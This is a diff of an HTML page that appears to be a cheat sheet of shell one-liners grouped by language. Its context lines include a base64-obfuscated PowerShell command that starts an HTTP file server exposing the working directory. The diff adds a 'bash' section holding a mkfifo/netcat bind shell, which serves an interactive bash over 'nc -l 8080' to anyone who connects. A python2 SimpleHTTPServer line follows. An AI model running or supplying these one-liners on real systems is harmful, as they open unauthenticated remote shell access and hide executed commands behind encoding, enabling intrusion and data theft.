@@ -60,6 +60,11 @@
 </span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nx">JABIAHMAbwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAEgAdAB0AHAATABpAHMAdABlAG4AZQByADsAJABIAHMAbwAuAFAAcgBlAGYAaQB4AGUAcwAuAEEAZABkACgAIgBoAHQAdABwADoALwAvACsAOgA4ADAAMAAwAC8AIgApADsAJABIAHMAbwAuAFMAdABhAHIAdAAoACkAOwBXAGgAaQBsAGUAIAAoACQASABzAG8ALgBJAHMATABpAHMAdABlAG4AaQBuAGcAKQB7ACQASABDAD0AJABIAHMAbwAuAEcAZQB0AEMAbwBuAHQAZQB4AHQAKAApADsAJABIAFIAZQBzAD0AJABIAEMALgBSAGUAcwBwAG8AbgBzAGUAOwAkAEgAUgBlAHMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBuAHQAZQBuAHQALQBUAHkAcABlACIALAAiAHQAZQB4AHQALwBwAGwAYQBpAG4AIgApADsAJABCAHUAZgA9AFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAKABHAEMAIAAoAEoAbwBpAG4ALQBQAGEAdABoACAAJABQAHcAZAAgACgAJABIAEMALgBSAGUAcQB1AGUAcwB0ACkALgBSAGEAdwBVAHIAbAApACkAKQA7ACQASABSAGUAcwAuAEMAbwBuAHQAZQBuAHQATABlAG4AZwB0AGgANgA0AD0AJABCAHUAZgAuAEwAZQBuAGcAdABoADsAJABIAFIAZQBzAC4ATwB1AHQAcAB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAEIAdQBmACwAMAAsACQAQgB1AGYALgBMAGUAbgBnAHQAaAApADsAJABIAFIAZQBzAC4AQwBsAG8AcwBlACgAKQB9ADsAJABIAHMAbwAuAFMAdABvAHAAKAApAA</span><span class="o">==</span><span class="w">
 </span></code></pre></div>
 
+<h2>bash</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="nb">rm</span> <span class="nt">-f</span> /tmp/f<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f<span class="p">;</span> <span class="nb">cat</span> /tmp/f | /bin/bash <span class="nt">-i</span> 2&gt;&amp;1 | nc <span class="nt">-l</span> 8080 <span class="o">&gt;</span> /tmp/f
+</code></pre></div>
+
 <h2>python 2</h2>
 
 <div class="highlight"><pre class="highlight shell"><code>python2.7 <span class="nt">-m</span> SimpleHTTPServer 8080
